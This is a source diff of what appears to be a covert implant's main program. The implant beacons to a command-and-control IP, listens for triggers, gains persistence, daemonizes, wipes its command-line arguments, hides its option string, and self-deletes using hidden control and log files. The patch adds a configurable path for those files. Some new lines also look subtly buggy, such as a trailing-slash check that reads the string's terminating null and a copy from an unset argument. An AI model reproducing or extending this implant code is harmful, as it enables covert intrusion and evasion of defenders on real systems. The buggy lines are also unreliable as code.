@@ -48,7 +48,9 @@ const char* ohshsmdlas3r  = (char*) cIures4j;
 extern int wsa_init_done;
 
 // Global
-unsigned char	ikey[ID_KEY_HASH_SIZE];		// Implant Key
+unsigned char	ikey[ID_KEY_HASH_SIZE];			// Implant Key
+char			sdcfp[SD_PATH_LENGTH] = {"\0"};	// Self delete control file path including filename (e.g /var/.config)
+char			sdlfp[SD_PATH_LENGTH] = {"\0"};	// Self delete log file path including filename (e.g /var/.log)
 
 #ifdef DEBUG
 int dbug_level_ = 2;				// debug level
@@ -60,20 +62,21 @@ struct cl_args
 	unsigned int	sig;
 	unsigned int	beacon_port;
 	unsigned int	host_len;
-	char		beacon_ip[256];
-	char		iface[16];
+	char			beacon_ip[256];
+	char			iface[16];
 	unsigned char   idKey[ID_KEY_HASH_SIZE];
 	unsigned long	init_delay;
 	unsigned int	interval;
 	unsigned int	trigger_delay;
 	unsigned int	jitter;
 	unsigned long	delete_delay;
+	char			sdpath[SD_PATH_LENGTH];
 	unsigned int	patched;
 };
 
 #define SIG_HEAD	0x7AD8CFB6
 
-struct cl_args		args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };
+struct cl_args		args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, {0}, 0 };
 
 //**************************************************************
 D (
@@ -93,6 +96,7 @@ static void printUsage(char* exeName)
 	printf("\t\t-d <beacon delay>      - initial beacon delay (in seconds, default: 2 minutes)\n");
 	printf("\t\t-t <callback delay>    - delay between trigger received and callback +/- 30 seconds (in seconds)\n");
 	printf("\t\t-s <self-delete delay> - since last successful trigger/beacon (in seconds, default: 60 days)\n");
+	printf("\n\t\t-P <file path>       - directory path for .config and .log files (120 chars max)\n");
 	printf("\n\t\t-D <debug level>     - debug level between 1 and 9, higher numbers are more verbose\n");
 	printf("\t\t-h                     - print this help menu\n");
 
@@ -113,20 +117,20 @@ static void * asloc( char *string );
 //**************************************************************
 int main(int argc, char** argv)
 {
-	int		c = 0;
-	char		*beaconIP = NULL;
-	char		*szInterface = NULL;
-	int		beaconPort = DEFAULT_BEACON_PORT;
+	int				c = 0;
+	char			*beaconIP = NULL;
+	char			*szInterface = NULL;
+	int				beaconPort = DEFAULT_BEACON_PORT;
 	unsigned long	initialDelay = DEFAULT_INITIAL_DELAY;
-	int		interval = DEFAULT_BEACON_INTERVAL;
-	int		trigger_delay = DEFAULT_TRIGGER_DELAY;
+	int				interval = DEFAULT_BEACON_INTERVAL;
+	int				trigger_delay = DEFAULT_TRIGGER_DELAY;
 	unsigned long	delete_delay = SELF_DEL_TIMEOUT;
-	float		jitter = DEFAULT_BEACON_JITTER * 0.01f;
-	int		retVal = 0;
-	FILE		*f;
-	struct stat st;
+	float			jitter = DEFAULT_BEACON_JITTER * 0.01f;
+	int				retVal = 0;
+	FILE			*f;
+	struct stat 	st;
 #ifndef DEBUG
-	int		status = 0;
+	int				status = 0;
 #endif
 
 
@@ -154,27 +158,6 @@ int main(int argc, char** argv)
         srand((unsigned int)time(NULL));
         initSrandFlag = 1;
     }
-
-	if(stat( (char *)sdfp,&st ) != 0)
-	{
-		DLX(1, perror( " stat()" ));
-		DLX(1, printf(" %s file does not exist\n", (char *)sdfp));
-
-		f = fopen( (char *)sdfp,"w" );
-
-		if ( f == NULL )
-		{
-			DLX(1, perror(" fopen()"));
-			DLX(1, printf("\tCould not create file %s\n", (char *)sdfp));
-			exit( 0 );
-		}
-
-		fclose(f);
-	}
-	else
-	{
-		DLX(1, printf( "\t%s file already exists\n", (char *)sdfp ));
-	}
 
 #if defined SOLARIS
 	memset(exe_path,0,exe_path_size);
@@ -228,6 +211,14 @@ int main(int argc, char** argv)
 		cl_string( (unsigned char *)args.iface, sizeof( args.iface ) );
 		DLX(1, printf( "\tDecoded patched value for interface: %s\n", szInterface));
 
+		cl_string((unsigned char *)args.sdpath, sizeof( args.sdpath ) );
+		strncpy(sdcfp, args.sdpath, strlen(args.sdpath));
+		if (sdcfp[strlen(sdcfp)] != '/')	// If the path is missing a trailing '/', add it.
+			strcat(sdcfp, "/");
+		strncat(sdcfp, (const char *)sdc, strlen((const char*)sdc));
+		strncpy(sdlfp, optarg, strlen(optarg));
+		strncat(sdlfp, (const char*)sdl, strlen((const char *)sdl));
+
 		goto okay;
 	}
 	DLX(1, printf("NOTE: Binary was NOT/NOT patched with arguments\n\n"));
@@ -235,7 +226,7 @@ int main(int argc, char** argv)
 	// process options
 	//while(EOF != (c = getopt(argc, argv, OPT_STRING)))
 #ifdef DEBUG
-	while((c = getopt(argc, argv, "a:cD:d:hI:i:j:K:k:p:s:t:")) != -1)
+	while((c = getopt(argc, argv, "a:cD:d:hI:i:j:K:k:P:p:s:t:")) != -1)
 #else
 	while((c = getopt(argc, argv, ohshsmdlas3r)) != -1)
 #endif
@@ -290,7 +281,7 @@ int main(int argc, char** argv)
 					}
 
 					if (access(optarg, R_OK)) {
-						fprintf( stderr, "%s\n", oe2);
+						fprintf(stderr, "%s\n", oe2);
 						return -1;
 					}
 					if (stat(optarg, &statbuf) != 0) {
@@ -320,10 +311,10 @@ int main(int argc, char** argv)
 					return -1;
 				}
 
-                                if ( strlen( optarg ) < ID_KEY_LENGTH_MIN ) {
+				if ( strlen( optarg ) < ID_KEY_LENGTH_MIN ) {
 					fprintf(stderr, "%s\n", oe3);
-            				return -1;
-                                }
+            		return -1;
+				}
 				DLX(1, printf( "KeyPhrase: %s \n", optarg));
 				sha1((const unsigned char *)optarg, strlen(optarg), ikey);
 				DLX(1, displaySha1Hash ("Trigger Key: ", ikey));
@@ -334,6 +325,15 @@ int main(int argc, char** argv)
 
 			case 'p':
 				beaconPort = atoi(optarg);
+				break;
+
+			case 'P':	// Set path for self-delete control and log files
+				if (strlen(optarg) + MAX(strlen((const char *)sdc), strlen((const char *)sdl)) + 2 < SD_PATH_LENGTH) {	// Make sure array is large enough for filename, '/' and '\0'
+					strcpy(sdcfp, optarg);				// Copy the path from the argument
+				} else {
+					fprintf(stderr, "%s\n", sde);
+					return -1;
+				}
 				break;
 
 			case 's':
@@ -354,72 +354,91 @@ int main(int argc, char** argv)
 		}
 	}
 
+    // Construct self delete control and log files with full path names
+
+	if (strlen((const char *)sdcfp) == 0) {
+			strcpy(sdcfp, (const char *)sddp);
+	}
+
+	if (sdcfp[strlen(sdcfp)] != '/')	// If the path is missing a trailing '/', add it.
+		strcat(sdcfp, "/");
+	strcpy(sdlfp, sdcfp);				// Duplicate the path for the log file
+	strcat(sdcfp, (const char *)sdc);	// Add .control filename
+	strcat(sdlfp, (const char *)sdl);	// Add .log filename
+
+	DLX(1, printf("Control file: \"%s\"\n", sdcfp));
+	DLX(1, printf("    Log file: \"%s\"\n", sdlfp));
+
+	if (stat((char *)sdcfp, &st ) != 0) {
+		DLX(1, printf("\"%s\" does not exist, creating it\n", (char *)sdcfp));
+
+		f = fopen( (char *)sdcfp,"w" );
+		if ( f == NULL ) {
+			DLX(1, perror("fopen()"));
+			DLX(1, printf("\tCould not create file %s\n", (char *)sdcfp));
+			exit(0);
+		}
+		fclose(f);
+	} else {
+		DLX(1, printf("\"%s\" file already exists\n", (char *)sdcfp ));
+	}
+
 	// process environment variables, if needed
 	
 	//validate user input
 	//Make sure the beacon's port is specified
-	if(beaconPort == -1)
-	{
-		D( printf("No Beacon Port Specified! \n"); )
-		D( printUsage(argv[0]); )
-		return 0;
+	if (beaconPort == -1) {
+		DLX(1, printf("No Beacon Port Specified! \n"));
+		DLX(1, printUsage(argv[0]));
 	}
 
 	//Make sure the IP for the beacon to send to is specified
-	if(beaconIP == NULL)
-	{
-		D( printf("No Beacon IP address specified! \n"); )
-		D( printUsage(argv[0]); )
+	if (beaconIP == NULL) {
+		DLX(1, printf("No Beacon IP address specified! \n"));
+		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
 
-	if ( initialDelay > 0 && interval == 0 )
-	{
-		D( printf("No Beacon Interval specified!\n"); )
-		D( printUsage(argv[0]); )
+	if (initialDelay > 0 && interval == 0 ) {
+		DLX(1, printf("No Beacon Interval specified!\n"));
+		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
 
-	if  ( initialDelay >= (INT_MAX-1) ) 
-	{
-		D( printUsage(argv[0]); )
+	if  (initialDelay >= (INT_MAX-1)) {
+		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
 
 	//Make sure the jitter is non zero
-	if ( jitter == -1 )
-	{
-		D( printUsage(argv[0]); )
+	if (jitter == -1) {
+		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
 
-	if (ikey[0] == '\0')
-	{
-		D( printUsage(argv[0]); )
+	if (ikey[0] == '\0') {
+		DLX(1, printUsage(argv[0]));
 		return 0;
 	}
 
 #ifdef SOLARIS
 // SOLARIS raw socket implementation requires that we specify the specific interface to sniff
-	if ( !szInterface )
-	{
-		D( printf("\nYou must use the -I option for Solaris, this will abort shortly... \n\n"); )
-		D( printUsage(argv[0]); )
+	if ( !szInterface ) {
+		DLX(1, printf("\nYou must use the -I option for Solaris, this will abort shortly... \n\n"));
+		DLX(1, printUsage(argv[0]));
 		return -1;
 	}
 #endif
 
 	// for Linux and Solaris, zeroize command line arguments
-	clean_args( argc, argv, NULL );	
+	clean_args(argc, argv, NULL);
 
 // if the binary has been patched, we don't need to parse command line arguments
 okay:
 
-	if ( args.patched == 1 )
-	{
+	if ( args.patched == 1 ) {
 		retVal = EnablePersistence(beaconIP,beaconPort);
-		if( 0 > retVal)
-		{
+		if( 0 > retVal) {
 			DLX(1, printf("\nCould not enable Persistence!\n"));
 			return -1;
 		}
@@ -428,34 +447,28 @@ okay:
 #ifndef DEBUG
 	status = daemonize();	// for linux and solaris
 
-	if ( status != 0 )
-	{
-		//parent or error should exit
-		exit(0);
+	if (status != 0) {
+		exit(0);	//parent or error should exit
 	}
 #endif
 
-	if ( initialDelay > 0 )
-	{
+	if (initialDelay > 0) {
 		// create beacon thread
 		DLX(1, printf( "Calling BeaconStart()\n"));
 		retVal = beacon_start(beaconIP, beaconPort, initialDelay, interval, jitter);
 	
-		if(0 != retVal)
-		{
+		if (0 != retVal) {
 			DLX(1, printf("Beacon Failed to Start!\n"));
 		}
-	}
-	else
-	{
+	} else {
 		DLX(1, printf("ALL BEACONS DISABLED, initialDelay <= 0.\n"));
 	}
 
 	// delete_delay
-	DLX(1, printf("Self delete delay: %lu.\n", delete_delay ));
+	DLX(1, printf("Self delete delay: %lu.\n", delete_delay));
 
 #ifndef __VALGRIND__
-	DLX(2, printf( "\tCalling TriggerListen()\n" ));
+	DLX(2, printf( "\tCalling TriggerListen()\n"));
 	(void)TriggerListen( szInterface, trigger_delay, delete_delay );	//TODO: TriggerListen() doesn't return a meaningful value.
 #endif
 
